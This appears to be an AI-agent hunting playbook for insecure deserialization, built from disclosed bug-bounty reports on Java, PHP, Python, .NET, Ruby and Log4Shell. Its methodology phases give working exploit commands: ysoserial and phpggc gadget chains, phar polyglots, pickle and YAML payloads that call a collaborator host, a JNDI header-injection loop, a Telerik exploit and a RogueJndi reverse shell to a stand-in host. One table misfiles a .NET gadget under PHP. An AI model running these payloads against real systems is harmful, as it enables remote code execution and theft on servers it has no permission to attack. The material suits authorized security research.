---
name: hunt-deserialization
description: Hunting skill for Insecure Deserialization (CWE-502), built from 118 assigned reports of which 84 full disclosed reports were read end-to-end. Covers Java ysoserial gadget chains (CommonsCollections, JBoss invokers, Oracle PeopleSoft monitor service, SnakeYAML, AMF BlazeDS), PHP object injection and phar:// deserialization (MyBB GMP type confusion, Vanilla Forums, Concrete CMS, WooCommerce CSV importer, Revive Adserver XML-RPC), Python pickle and YAML.load (Django cache backends, Liberapay, Apache Airflow XComs), Ruby Marshal.load universal gadgets (RubyGems), .NET BinaryFormatter / DotNetNuke DNNPersonalization cookie (CVE-2017-9822, CVE-2019-18935), JNDI/Log4Shell (Aiven Kafka Connect, Acronis CVE-2021-44228), Tomcat session-persistence deserialization (CVE-2025-24813), and PHP WDDX/unserialize memory corruption. Use when the target runs Java, PHP, Python pickle/YAML, .NET, Ruby, or exposes serialized-object endpoints, cookies, import/upload, or cached/queued data. Deserialization-to-RCE is almost always Critical — OOB callback or command output required before reporting.
sources: hackerone_public, internet_bug_bounty, github_public_code_search
report_count: 118
full_reports_read: 84
---

# HUNT-DESERIALIZATION — Insecure Deserialization

> Built from 84 full disclosed reports. 75 of them carried the literal deserialization
> signal; 41 were found by public code search; 23 by search/filter/sort parameters.
> The dominant discovery truth: you usually find the *sink in source* (`unserialize`,
> `Marshal.load`, `pickle.load`, `YAML.load`, a deserializing endpoint), then hunt for a
> way to control the bytes that reach it. RCE is the default outcome, so severity is
> almost always Critical.

---
## Crown Jewel Targets

Deserialization is highest-value when an attacker-controlled blob reaches a native
object-reconstruction sink and standard-library or framework "gadget" classes are on
the classpath. Priority targets, ranked by how often they appeared as a working chain
in the 84 reports:

- **Java serialized-object endpoints** — `application/x-java-serialized-object`,
  `rO0A`/`AC ED 00 05` blobs, exposed invoker servlets. Reported working against
  **JBoss JMXInvokerServlet/EJBInvokerServlet** (#153026), **Oracle PeopleSoft
  "monitor" service** (#329376, #329399, #329400, #329397), **Apache Flex BlazeDS
  AMF** `messagebroker/amf` (#728614).
- **.NET formatters in cookies/config** — `DNNPersonalization` cookie on **DotNetNuke**
  (#876708, #2762119, CVE-2017-9822) with the `ExpandedWrapper`+`ObjectDataProvider`
  gadget; also **Telerik Web UI** `Telerik.Web.UI.WebResource.axd?type=rau` chained
  through CVE-2017-11317 upload into CVE-2019-18935 deserialization (#838196,
  #1174185, #913695).
- **PHP `unserialize()` with POP gadgets** — user-controlled values hitting
  `unserialize()` in WordPress plugins (#185907, #308489), `GMP`/`DateInterval`
  type-confusion in MyBB (#198734), and config-driven injection in Vanilla Forums
  (#407552, #410212).
- **PHP `phar://` deserialization (no `unserialize()` needed)** — any filesystem call
  (`file_exists`, `is_dir`, `getimagesize`, `fopen`) on a `phar://` path triggers
  metadata deserialization: **Vanilla Forums** (#410237 admin, #410882 *unauthenticated*
  via `getimagesize`), **Concrete CMS** (#921288 arbitrary file delete), **WooCommerce
  CSV importer** (#403083).
- **Python pickle / YAML** — pickled caches and queues where an attacker can poison
  stored bytes: **Django cache backends** (#1415436), **Liberapay notification pickles**
  (#361341) and `yaml.load` (#2467232), **Apache Airflow XComs** pickle poisoning
  (#2334460).
- **Ruby `Marshal.load`** — **RubyGems** gem-checksum YAML→Marshal chain (#274990) and
  the `/api/v1/dependencies` `Marshal.dump` response consumed by Bundler (#1119120);
  universal `Gem::Requirement`/`Gem::Installer` gadget for Ruby 2.x–3.x.
- **JNDI / Log4Shell string interpolation** — attacker-controlled config or header
  reaching a JNDI lookup: **Aiven Kafka Connect** `sasl.jaas.config` with
  `JndiLoginModule` → RogueJndi reverse shell (#1529790, $5,000), **Acronis**
  `${jndi:ldap://...}` header injection (#1425474, CVSS 10.0).
- **Deserialization-of-trusted-storage primitives** — **Apache Tomcat** partial PUT +
  file-based session persistence + gadget library = RCE (CVE-2025-24813, #3031518,
  $4,323). Second-order stores (caches, session files, DB columns, XComs) matter as
  much as direct request parameters.

Payouts in the corpus: $25 (Ian Dunn #185907), $200 (Hyperledger #801370), $500
(PHP WDDX #170144), $600 (multiple Vanilla criticals), $1,000 (Acronis Log4Shell),
$1,500 (RubyGems #274990), $5,000 (Aiven #1529790), $4,323 (Tomcat #3031518).
Severity cluster: overwhelmingly Critical/CVSS 10.0 where RCE is demonstrated; Medium/Low
only where exploitation needs a precondition (cache compromise, poisoned internal data).

---
## Attack Surface Signals
### Serialization Format Fingerprints (what the bytes look like)

```
Java serialized object   : AC ED 00 05 (hex)  |  rO0A / rO0AB (base64)
Java externalizable      : AC ED 00 05 ... TC_OBJECT / TC_CLASS
PHP serialization        : O:8:"stdClass":0:{}  |  a:1:{i:0;...}  |  C:3:"GMP":...
PHP phar metadata        : __HALT_COMPILER();  inside a .jpg/.png polyglot
Python pickle            : \x80\x04 (proto 4) / \x80\x02 (proto 2) -> base64
Python YAML              : !!python/object/apply:os.system ['id']
.NET BinaryFormatter     : AAEAAAD///// (base64) / \x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF
Ruby Marshal             : \x04\x08 (Marshal.dump version 4.8)
AMF (BlazeDS)            : \x00\x03\x00\x00\x00\x01 ... \x11\x0a (application/x-amf)
WDDX                     : <wddxPacket version='1.0'> ... <struct>
JNDI / Log4Shell         : ${jndi:ldap://HOST/a}  ${jndi:dns://HOST/a}  ${${...}}
```
### URL / Endpoint / Parameter Patterns to Hunt

```
# Endpoints seen serving or consuming serialized objects in the corpus
/invoker/EJBInvokerServlet, /invoker/JMXInvokerServlet   # JBoss (#153026)
/invoker/JMXInvokerServlet                                # JBoss
/wls-wsat/CoordinatorPortType                             # WebLogic
/Telerik.Web.UI.WebResource.axd?type=rau                  # Telerik (#838196,#1174185,#913695)
/daip/messagebroker/amf                                   # BlazeDS AMF (#728614)
/api/v1/dependencies                                      # RubyGems Marshal response (#1119120)
/api/v1/gems                                              # gem package parse (#274990)
/psc/EXPROD_1/, /psc/EXPROD/                              # PeopleSoft monitor service (#329376,#329399)
/www/delivery/dxmlrpc.php                                 # XML-RPC pluginExecute (#542670)

# Parameters that commonly carry serialized bytes or paths
?file=, ?path=, ?import=, ?mapping=, ?data=, ?obj=
?callback=, ?type=, ?format=, ?class=, ?config=
# Cookie carriers: DNNPersonalization, rememberMe, nc_form_fields,
#                  __VIEWSTATE, PHPSESSID->session-file, custom session blobs
```
### Transport / Content Negotiation Signals

```
Accept: application/x-amf, application/x-java-serialized-object
Content-Type: application/x-amf -> typed AMF deserializer behind it
Response Content-Type: application/octet-stream with body starting \x04\x08
                       -> Ruby Marshal or Python pickle response (#1119120)
Response header/body "RadAsyncUpload handler is registered succesfully"
                       -> Telerik RAU handler present (#1174185, #913695)
Response HTML comment "Performance optimized by Redis Object Cache"
                       -> serialized object cache in play (#2248328)
```
### Header / Cookie / Content-Type Signals

```
Content-Type: application/x-java-serialized-object
Content-Type: application/x-amf                 # BlazeDS AMF (#728614)
Content-Type: application/octet-stream          # model/serialized-body upload
Cookie: rememberMe=...                          # Apache Shiro (default AES key)
Cookie: DNNPersonalization=...                  # DotNetNuke (#876708, #2762119)
Cookie: nc_form_fields=TzozN...                 # base64 PHP object -> RCE (#2248328)
Cookie: __VIEWSTATE / __VIEWSTATEGENERATOR       # ASP.NET ViewState without MAC
Endpoints: /invoker/, /jmx-console/, /wls-wsat/
           /Telerik.Web.UI.WebResource.axd?type=rau
           /daip/messagebroker/amf, /api/v1/dependencies
           /psc/EXPROD_1/ (PeopleSoft "monitor" service)
```
### Stack / Technology Signals (from the reports)

- **Java/J2EE enterprise middleware** — JBoss invokers, WebLogic `wls-wsat`, Oracle
  PeopleSoft, Hyperledger Fabric SDK (SnakeYAML), Kafka Connect, Apache Tomcat session
  persistence, Apache Flex BlazeDS AMF.
- **PHP CMS/framework ecosystem** — WordPress/WooCommerce, Vanilla Forums, Concrete
  CMS, MyBB, Revive Adserver, ownCloud/Nextcloud apps. Look for plugin/module source
  with `unserialize`, `yaml.load`, or filesystem calls on user paths.
- **Python data/ML stack** — Django cache backends, Airflow XComs, notification queues,
  imported "model" files (pickle), `yaml.load` in test/config loaders.
- **.NET / ASP.NET** — DotNetNuke, Telerik UI, ViewState, BinaryFormatter formatters.
- **Ruby / RubyGems ecosystem** — Marshal-based API responses, gem package parsing.
- **Any logging stack that interpolates user text** — Log4j 2.x → JNDI lookup.
- **Import / export / file-upload features** — CSV importers, backup restore, image
  processors, "upload from URL" — the bytes often reach a deserializer indirectly.
### Code-Review Grep Patterns

```bash
# PHP: direct unserialize and phar-reachable filesystem sinks
grep -rEn "unserialize\(|maybe_unserialize|__wakeup|__destruct|phar://|getimagesize\(|file_exists\(" --include="*.php" .
# Java: native deserialization + unsafe YAML/XML parsers
grep -rEn "ObjectInputStream|readObject|readUnshared|new Yaml\(|Yaml\.load|XMLDecoder|JndiLookup|InitialContext|lookup\(" --include="*.java" .
# Python: pickle + unsafe YAML
grep -rEn "pickle\.(load|loads)|yaml\.(load|unsafe_load)|cPickle|dill\.load|marshal\.loads" --include="*.py" .
# .NET: BinaryFormatter and formatters
grep -rEn "BinaryFormatter|ObjectStateFormatter|LosFormatter|NetDataContractSerializer|JavaScriptSerializer|TypeNameHandling" --include="*.cs" .
# Ruby: Marshal
grep -rEn "Marshal\.(load|restore)|YAML\.load" --include="*.rb" .
# JNDI / Log4j strings
grep -rEn '\$\{jndi:|log4j' --include="*.java" --include="*.xml" --include="*.properties" .
```

---
## Discovery Patterns From 84 Full Reports
### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Public/source-code search (41 reports — second only to raw deserialization).**
   *What to look for:* GitHub/source for the exact product version with `unserialize(`,
   `Marshal.load`, `pickle.load`, `Yaml yaml = new Yaml(`, `ObjectInputStream`,
   `BinaryFormatter`, `phar://`, or a declared dependency on a known-gadget library
   (Monolog, CommonsCollections, ObjectDataProvider, Telerik). #185907 and the Vanilla
   reports (#407552, #410212, #410237, #410882) were pure source audits naming the
   exact vulnerable line. #801370 cited four precise source files/lines in Hyperledger
   Fabric SDK. **Public code tells you the sink exists before you send a single packet.**

2. **Search / filter / sort parameters (23 reports).** *What to look for:* parameters
   that feed cached/stored query objects which are later unserialized — e.g.
   #308489 `get_job_listings` caches a `WP_Query` via `set_transient()` built from
   user-controllable search args; #1415436 Django caches; #2334460 Airflow XComs.
   Ask: "does my input get serialized into a store the server reads back?"

3. **Cookie handling (8 reports).** *What to look for:* any cookie carrying a blob —
   `DNNPersonalization`, `rememberMe`, `nc_form_fields` (base64 that decodes to
   `O:...` PHP object, #2248328), `.ASPXAUTH`, `__VIEWSTATE`, session IDs that map to
   file-based persistence. Decode cookies with base64/hex and look for serialization
   magic bytes.

4. **XML / parser endpoints (13 reports).** *What to look for:* XML-RPC, WDDX, SOAP,
   AMF, YAML config endpoints where a parser can instantiate types. #542670
   `pluginExecute` XML-RPC `unserialize()` on the first parameter; #170144/#161200/
   #161217 WDDX packet deserialization memory bugs; #801370/#1739099 SnakeYAML
   arbitrary type construction.

5. **File upload / import features (8 + 6 import reports).** *What to look for:*
   "upload-from-URL," media uploaders, CSV importers, backup restore, plugin installs.
   The upload itself may be benign; the bug is a later filesystem call on a `phar://`
   path (#403083, #410882, #410237, #921288) or a parsed gem/package (#274990).

6. **Image processing (12 reports).** *What to look for:* `getimagesize()`,
   thumbnailers, screenshot services reached with attacker paths — the classic
   *unauthenticated* phar trigger (#410882).

7. **API endpoints (11 reports) and admin/internal panels (9).** *What to look for:*
   config-setting APIs that accept class names / connection strings / JAAS config
   (#1529790), or admin export/import controllers that accept file paths (#410237).

8. **Server-side rendering / template engines (10 + 4).** *What to look for:*
   template fragments, notification renderers, and config values that are later
   deserialized — #361341 notifications rendered through pickle, #407552 the
   `Garden.TouchIcon` config value flowing into a deserialization path.

9. **Cache layer (8) and second-order stores (4).** *What to look for:* Redis/Memcached/
   file-backed caches that store serialized objects; poisoning the store = RCE on read
   (#1415436, #308489, #2334460).

10. **Blind OOB / time-based (5 + 2).** *What to look for:* endpoints where you cannot
    see output, so you make the gadget call out (DNS/HTTP callback) or sleep
    (#838196 "make the server sleep for 10 seconds"; #329376 OOB DNS via
    `jexboss.info`; #728614 AMF pingback; #1425474 Log4Shell interactsh callback).
### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

| Signal (full-report count) | Why it matters | What to probe |
|---|---|---|
| deserialization (75) | The core bug class; almost always yields RCE | Find the sink in source, then control the bytes reaching it |
| public-code-search (41) | Sink + gadget library visible before any request | `grep` the product version; check `composer.json`/`pom.xml`/`requirements.txt` |
| search-filter-sort (23) | User input gets cached/serialized into stored objects | Submit unique strings; check if they reappear base64/serialized in responses/cookies |
| comment-injection (13) | Comment fields are stored then unserialized on render | Put a marker in a comment; look for it in cached serialized blobs |
| xml-parser (13) | Parsers instantiate arbitrary types (YAML, XML-RPC, WDDX, AMF) | Send typed payloads (`!!python/object`, `<struct>`, typed AMF) |
| image-processing (12) | `getimagesize()`/thumbnailers trigger phar deserialization | Pass `phar://...` paths to image parameters |
| api-endpoint (11) | Config APIs accept class/JNDI/serialized fields | Fuzz fields with `${jndi:...}` and serialized blobs |
| server-side-rendering (10) | Renderers reflect deserialized values into output | Inject benign object, watch for reflection/error change |
| redirect-handling (9) | Fetch/import steps follow paths you can swap to `phar://` | Modify POST path params to `phar://uploads/x.jpg` |
| admin-internal (9) | Admin import/export controllers deserialize file paths | Test export/import and storage-location path fields |
| cookie-handling (8) | Cookies are a top serialized-blob carrier | Base64/hex-decode every cookie; look for `O:`, `rO0A`, `Tzoz` |
| cache-layer (8) | Poisoned cache = RCE on next read | Find cache keys derived from user input |
| internal-network (8) | Second-order / internal consumers deserialize your data | Poison shared data consumed by internal services |
| file-upload (8) | Needed to place a phar/payload on disk | Upload polyglot `.jpg` with phar metadata; note the stored path |
| base64-encoding (7) | Hides serialized bytes from casual inspection | Decode body/cookie/base64 params and re-inspect |
| command-injection (7) | Gadget chains end in OS commands | Prove with `id`/`sleep`/OOB callback, not error text |
| debug-error-leak (6) | Stack traces reveal the sink class/library/version | Send malformed serialized data; read the exception/class names |
| proxy-feature (6) | Proxy/fetch features pass URLs & paths to deserializers | Swap fetched path for `phar://` or JNDI URL |
| dos-resource (6) | Memory-corruption UAFs in unserialize/WDDX | Fuzz malformed serialized structures (crash = signal) |
| import-feature (6) | Import parsers call `YAML.load`/`unserialize` | Upload crafted import file with typed objects |
| blind-oob (5) | No output; callback is the only proof | Use DNS/HTTP callback gadget or sleep |
### Verbatim Discovery Clues (18 real `[#id]` quotes)

> Verbatim "how I found it" / reproduction lines from the disclosed reports. These are
> the researcher's own words; they show the *exact* reasoning that led to the bug.

1. `[#838196]` "I found an outdated version of Telerik Web UI (v2016."
2. `[#838196]` "First of all, the only thing that I tried to prove that I had successfully achieved code execution was making the server sleep for 10 seconds."
3. `[#838196]` "com/noperator/CVE-2019-18935) because I noticed that when uploading the ."
4. `[#153026]` "I found an open JMXInvokerServlet/EJBInvokerServlet and normally I should be able to get a shell just by doing that."
5. `[#913695]` "With a slight modification to the script in the BishopFox write-up, I was able to determine the software version:"
6. `[#913695]` "As shown in the results, the version is vulnerable to CVE-2017-11317 and I was able to successfully upload the `testfile."
7. `[#562335]` "I found a deserialization vulnerability in the [OwnBackup](https://marketplace."
8. `[#274990]` "Using classes accessible within the application, I was able to turn this into a call to `Marshal."
9. `[#274990]` "From there, I was able to use known Marshal exploitation techniques to achieve code execution on the server (I'm omitting some details here for brevity so that I can submit this report right away)."
10. `[#3031518]` "I found an Apache Tomcat RCE vulnerability in tomcat 9."
11. `[#921288]` "To chain gadgets, I found 3 nice gadgets to delete some files."
12. `[#146233]` "This vulnerability was discovered during the auditing of a vendor on Hackerone and could be successfully remotely exploited."
13. `[#146235]` "This vulnerability was discovered during the auditing of a vendor on Hackerone."
14. `[#350418]` "Also I found a couple of other modules (for example, https://www."
15. `[#200909]` "I have found and reported an out of bounds memory read in PHP:"
16. `[#329376]` "For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (testing1.jexboss.info)."
17. `[#1425474]` "I used this [script](https://github.com/fullhunt/log4j-scan) to find this. It spins up an interact-sh server to receive the callback and send the payload in the query string and about 30 diffent headers."
18. `[#1119120]` "In `GET /api/v1/dependencies`, which Bundler uses to check dependencies, the response is `Marshal.dump` instead of `JSON`."
### Probe Checklist (15 concrete probes)

Run these against each candidate sink; each maps to a real pattern in the corpus.

1. **Fingerprint the serialized bytes** — submit a benign `O:8:"stdClass":0:{}` /
   `rO0ABXQ=` / `gASV...` and watch whether the error changes (error delta = deserializer
   reached). Start with a well-formed object, not a garbage string.
2. **Decode every cookie** — base64/URL/hex-decode `rememberMe`, `DNNPersonalization`,
   `nc_form_fields`, custom session cookies; flag `O:`, `C:`, `rO0A`, `Tzoz`, `\x04\x08`.
3. **Find the sink in public source** — grep the exact product/version for
   `unserialize(`, `readObject(`, `Marshal.load`, `pickle.load`, `Yaml(`, `BinaryFormatter`.
4. **Check gadget library presence** — confirm CommonsCollections / Monolog /
   ObjectDataProvider / Telerik / PodLove-Monolog is on the box before spending time
   on a chain (#2248328 used the Monolog shipped with PodLove).
5. **Version-fingerprint the framework** — outdated Telerik (#838196, #913695) and
   Tomcat 9.0.98 (#3031518) were exploited by matching a known CVE to a version.
6. **Test the sleep oracle** — first proof of execution can be a 10-second delay
   (#838196) or a sync `sleep` in the gadget, before attempting a full shell.
7. **Plant an OOB callback gadget** — DNS/HTTP to your collaborator proves blind
   execution (#329376, #728614, #1425474); use a unique subdomain per parameter.
8. **Probe `phar://` on every path parameter** — upload a phar-polyglot `.jpg`, then
   feed `phar://uploads/x.jpg` to image/file functions (#403083, #410882, #410237,
   #921288).
9. **Inject JNDI in every logged/config field** — User-Agent, X-Forwarded-For,
   Referer, and config strings like `sasl.jaas.config` with `${jndi:ldap://HOST/a}`
   (#1529790, #1425474).
10. **Test typed YAML/XML/AMF deserialization** — `!!python/object/apply:os.system`,
    `<wddxPacket>`, `application/x-amf` bodies with a collaborator host embedded
    (#2467232, #542670, #728614).
11. **Poison a second-order store** — put a marker in a search/comment field and check
    whether it is serialized into a cache/transient/XCom read back later (#308489,
    #1415436, #2334460).
12. **Check .NET ViewState MAC** — absence of `__VIEWSTATEMAC`/MAC validation means
    unsigned ViewState → YSoSerial.Net TypeConfuseDelegate; test DotNetNuke cookie path.
13. **Inspect API responses consumed as objects** — `/api/v1/dependencies` returning
    `Marshal.dump` means the *client* deserializes (MITM/dependency-confusion angle,
    #1119120).
14. **Read debug/stack errors** — malformed blobs that surface a class name or stack
    trace reveal the exact sink and gadget library (#1529790 "debug-error-leak").
15. **Confirm output channel early** — decide now whether you get command output in
    the response (#2248328 leaked `uid=33(www-data)` into the HTML), a blind callback,
    or a file-write primitive — this sets your reporting strategy.

---
## Step-by-Step Hunting Methodology
### Phase 1 — Locate the Sink (public-code-first)

1. Fingerprint the stack (framework, language, version) from headers, error pages,
   JS assets, and `?type=rau`-style query strings.
2. Search public source for the exact product/version and grep the patterns in
   `Attack Surface Signals`. The 41 public-code-search reports show this is the single
   most productive recon step after finding a deserializer.
3. Inventory every place serialized bytes can enter: request body/cookie, uploaded
   file, cached/stored value, API response, config/JAAS string, JNDI-interpolated log.
4. Confirm a gadget library is present ( ysoserial CommonsCollections; phpggc Monolog/
   Laravel; .NET ObjectDataProvider/ExpandedWrapper; Ruby Gem::Installer/Gem::Requirement;
   Java SnakeYAML/JndiLoginModule).
### Phase 2 — Java Deserialization (ysoserial)

```bash
# Obtain ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 1) Blind OOB detection payload (DNS/HTTP callback) — prove exec first
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# 2) Send to a serialized-object endpoint (JBoss/PeopleSoft/WebLogic pattern)
java -jar ysoserial-all.jar CommonsCollections1 'cmd.exe' > serialdata
curl -s https://$TARGET/invoker/EJBInvokerServlet \
  -H 'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation' \
  --data-binary @serialdata

# 3) Sleep oracle when output is blind (Telerik-style proof)
java -jar ysoserial-all.jar CommonsCollections6 'sleep 10' | base64

# 4) JNDI / Log4Shell config injection (Aiven Kafka pattern)
#    set sasl.jaas.config with com.sun.security.auth.module.JndiLoginModule
#    connectionURL="ldap://YOUR_HOST:1389/a"  -> RogueJndi -> reverse shell
```
### Phase 3 — PHP Object Injection & phar://

```bash
# Find unserialize sinks in source
grep -r "unserialize(" --include="*.php" .

# Benign probe — if error/output changes, unserialize() is reached
O:8:"stdClass":1:{s:4:"test";s:5:"value";}

# phpggc: list and build gadget chains
git clone https://github.com/ambionics/phpggc
php phpggc -l
php phpggc Laravel/RCE5 system id | base64
php phpggc Monolog/RCE1 system id        # shipped with PodLove (#2248328)

# phar:// deserialization with NO unserialize() in code
phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # image+phar polyglot
# then reach it through any filesystem function:
#   GET /import?file=phar://uploads/poly.jpg/x
#   file_exists()/getimagesize()/is_dir()/fopen() on the phar path triggers it
```
### Phase 4 — Python pickle / YAML

```bash
# pickle __reduce__ OOB payload
python3 -c "
import pickle, os, base64
class E(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(E())).decode())
"
# send as cookie or model/serialized body to /api/load-model

# Insecure YAML.load (pre-5.1 default-unsafe, #2467232)
!!python/object/apply:os.system ['curl http://COLLAB_HOST/yaml']

# Second-order poison: write malicious pickle into a cache/XCom/notifications store
# then trigger the read path (Django cache #1415436, Airflow XCom #2334460,
# Liberapay notifications #361341)
```
### Phase 5 — .NET (BinaryFormatter / DotNetNuke / ViewState)

```bash
# YSoSerial.Net — DotNetNuke cookie plugin (CVE-2017-9822)
ysoserial.exe -p DotNetNuke -c 'write_file' -u http://HOST/shell.aspx
# ExpandedWrapper`2[[FileSystemUtils],[ObjectDataProvider]] gadget -> DNNPersonalization cookie

# TypeConfuseDelegate for unsigned ViewState
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64

# Telerik UI: upload CVE-2017-11317 payload, then deserialize via CVE-2019-18935
python3 CVE-2019-18935.py -u https://$TARGET/Telerik.Web.UI.WebResource.axd?type=rau \
  -v 2016.2.607.40 -f 'C:\Windows\Temp' -p sleep.dll
```
### Phase 6 — Ruby Marshal

```bash
grep -r "Marshal.load\|Marshal.restore\|YAML.load" --include="*.rb" .
# Universal Ruby 2.x-3.x gadget (#1119120, #274990):
#   payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
#   where r is a Gem::Requirement whose __reduce__/instance vars trigger command exec
# Turn a YAML.load sink into Marshal.load using classes available in the app (#274990).
```
### Phase 7 — JNDI / Log4Shell (all user-controlled inputs)

```bash
COLLAB="COLLAB_HOST"
for H in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language" "Host"; do
  curl -s https://$TARGET/ -H "$H: \${jndi:ldap://$COLLAB/$H}" &
done
# POST body fields
curl -s -X POST https://$TARGET/api/login -H 'Content-Type: application/json' \
  -d '{"username":"${jndi:ldap://COLLAB/a}"}'
# Automated discovery (as used in #1425474)
python3 log4j-scan.py -u 'https://TARGET/'
```
### Phase 8 — Prove and Document

- Establish the output channel: command output in response (#2248328), OOB callback,
  or file write. Capture exact evidence.
- Attribute the callback to **one** parameter — generate a unique payload per field,
  one request each. A batch of payloads with callbacks but no attribution is useless
  to the client fixing the sink.
- For blind RCE, a DNS/HTTP hit from a gadget-generated callback, tied to one parameter,
  is sufficient for a Critical PoC.
### Phase 9 — Sink-to-First-Proof Triage Matrix

| Confirmed sink | Cheapest first proof | Escalation to full RCE |
|---|---|---|
| Java `ObjectInputStream.readObject` | ysoserial URLDNS gadget (pure DNS, no command) | CommonsCollections6 → `curl COLLAB` / reverse shell |
| JBoss/PeopleSoft/Telerik exposed handler | sleep 10 / OOB DNS lookup | ysoserial command gadget, file write |
| PHP `unserialize()` | benign `O:8:"stdClass":0:{}` error delta | phpggc Monolog/Laravel RCE chain |
| PHP `phar://` reachable via fs call | upload polyglot, point path at `phar://` | phpggc `-p phar` gadget → command |
| Python `pickle.load` | `__reduce__` → `os.system('sleep 5')` | `__reduce__` → `curl COLLAB` / bind shell |
| Python `yaml.load` | `!!python/object/apply:os.system ['id']` | same primitive with `curl COLLAB` |
| Ruby `Marshal.load` | `Marshal.dump([Gem::Requirement,...])` benign marker | universal Gem::Installer gadget |
| .NET BinaryFormatter / DNN cookie | ysoserial.net DotNetNuke `read_file` | `write_file` / `ObjectDataProvider` command |
| JNDI / Log4Shell field | `${jndi:dns://COLLAB/probe}` callback | `${jndi:ldap://COLLAB/a}` → RogueJndi class load |
| Tomcat session persistence | partial PUT a serialized session file | gadget library in session → RCE (#3031518) |
### Phase 10 — Self-Review Before Submission

- Re-read the report against Gate 0: is execution *demonstrated*, not inferred?
- Does every OOB callback have a unique marker and a single responsible parameter?
- Is the precondition (auth level, poisoned store, exact version) stated explicitly?
- Are all commands, payloads, and version-detection steps reproducible verbatim?
- Does the impact paragraph name the concrete loss (file read/write, command exec,
  lateral movement) rather than just "deserialization vulnerability exists"?

---
## Payload & Detection Patterns
### Cross-Language Fingerprint Quick Reference

| Format | Magic bytes | Minimal benign probe | OOB gadget example |
|---|---|---|---|
| Java | `rO0A` / `AC ED 00 05` | `rO0ABXQ=` (serialized String) | ysoserial `CommonsCollections6 'curl COLLAB'` |
| PHP | `O:` / `a:` / `C:` | `O:8:"stdClass":0:{}` | phpggc `Monolog/RCE1 system curl` |
| Python pickle | `\x80\x04` | `gASV...` (base64) | `__reduce__` → `os.system('curl COLLAB')` |
| Ruby Marshal | `\x04\x08` | `\x04\x08I"\0` | `Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])` |
| .NET | `AAEAAAD/////` | base64 BinaryFormatter header | `ExpandedWrapper` / `TypeConfuseDelegate` |
| YAML | `!!python/...` | `!!python/object/apply:os.system ['id']` | same with `curl COLLAB` |
| AMF | `\x00\x03` | `\x00\x03\x00\x00\x00\x01...\x0a` | collaborator host inside typed AMF (#728614) |
| JNDI | `${jndi:` | `${jndi:dns://COLLAB/probe}` | `${jndi:ldap://COLLAB/a}` → RogueJndi |
### Detection Workflow (OOB listener mandatory for blind cases)

```bash
# Start an OOB listener
interactsh-client -v -n 5
# Burp Collaborator / canarytokens.org also work

# Java: send OOB gadget, then poll listener
java -jar ysoserial-all.jar CommonsCollections6 'curl http://COLLAB/ysoserial' | base64

# PHP phar: generate image+phar polyglot, upload, then trigger via fs call
phpggc -p phar -o poly.jpg Monolog/RCE1 system 'curl http://COLLAB/phar'

# Log4j: inject across headers and params, observe callback
curl -H 'User-Agent: ${jndi:dns://COLLAB/ua}' https://$TARGET/
```
### PHP Type-Confusion / POP Specifics (#198734)

```php
// MyBB GMP unserialize type confusion: craft a serialized GMP object whose inner
// data is an object; __wakeup/convert_to_long type-juggling turns it into a ZVAL
// confusion exploitable for RCE on PHP 5.6 < 5.6.30.
$inner = 's:1:"1";a:3:{s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:{s:4:"ryat";R:2;}}';
$exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
```
### Universal Ruby Gadget Skeleton (#1119120, #274990)

```ruby
# prevent payload running at Marshal.dump time
class Gem::Requirement
  # ... crafted instance variables ...
end
rs = Gem::RequestSet.allocate
# ...
payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
# YAML.load -> Marshal.load escalation: embed marshalable objects in a YAML doc.
```
### JNDI Exploit Kit / RogueJndi (#1529790)

```bash
git clone https://github.com/pimps/JNDI-Exploit-Kit
java -jar RogueJndi-1.1.jar --hostname HOST -c \
  "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/HOST/4445<&1"
nc -nlvp 4445
# Aiven Kafka: set database.history.producer.sasl.jaas.config on
# io.debezium.connector.mysql.MySqlConnector with JndiLoginModule connectionURL.
```
### WDDX / XML-RPC / AMF Payload Notes (#542670, #728614, #170144)

```
XML-RPC: trigger unserialize() on first param of "pluginExecute" method.
WDDX:    <wddxPacket version='1.0'><data><struct><var name='aDateTime3'>
         <dateTime>...</dateTime></var></struct></data></wddxPacket>
AMF:     amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' + ...
         POST with Content-Type: application/x-amf; embed collaborator host in typed payload.
```
### Gadget Chain Cheat Sheet (grounded in the corpus)

| Language / sink | Gadget / chain | Source reference in pack |
|---|---|---|
| Java CommonsCollections | `CommonsCollections1/6` (ysoserial) | JBoss #153026, DoD/PeopleSoft #329376 |
| Java SnakeYAML | arbitrary Java type instantiation → exec | Hyperledger #801370 |
| Java JNDI | `JndiLoginModule` → RogueJndi → reverse shell | Aiven #1529790 |
| Java Log4j | `${jndi:ldap://HOST/a}` → remote class load | Acronis #1425474 |
| Java AMF | typed AMF deserialization → callback | BlazeDS #728614 |
| Java Tomcat session | partial PUT → file-based session deserialization | CVE-2025-24813 #3031518 |
| PHP GMP / DateInterval | `C:3:"GMP"` type confusion → ZVAL/UAF | MyBB #198734 |
| PHP Monolog | `Monolog/RCE1` via `unserialize` or `phar://` | nextcloud/WP #2248328, #403083 |
| PHP ObjectDataProvider | `ExpandedWrapper` + `FileSystemUtils` | DNN #2762119, #876708 |
| PHP WDDX | `wddx_deserialize` recordset/dateTime UAF/NULL deref | #170144, #161200, #161217 |
| PHP XML-RPC | `unserialize()` on `pluginExecute` first param | Revive #542670 |
